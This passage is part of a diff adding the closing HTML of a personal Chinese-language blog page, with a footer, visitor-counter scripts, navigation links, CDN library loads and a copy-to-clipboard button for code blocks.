+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2026
+    Fluorine Wang
+  </div>
+
+  <!-- Begin 不蒜子统计 -->
+  <!-- <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script> -->
+  <!-- <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span> -->
+  <!-- End 不蒜子统计 -->
+
+  <!-- Begin Vercount统计 -->
+  <script defer src="https://events.vercount.one/js"></script>
+  本页访问 <span id="vercount_value_page_pv">Loading</span>
+  总访问量 <span id="vercount_value_site_pv">Loading</span>
+  总访问者 <span id="vercount_value_site_uv">Loading</span>
+  <!-- End Vercount统计 -->
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/friends/">友链</a></li><!--
+     --><!--
+       --><li><a href="/QSL/">QSL</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
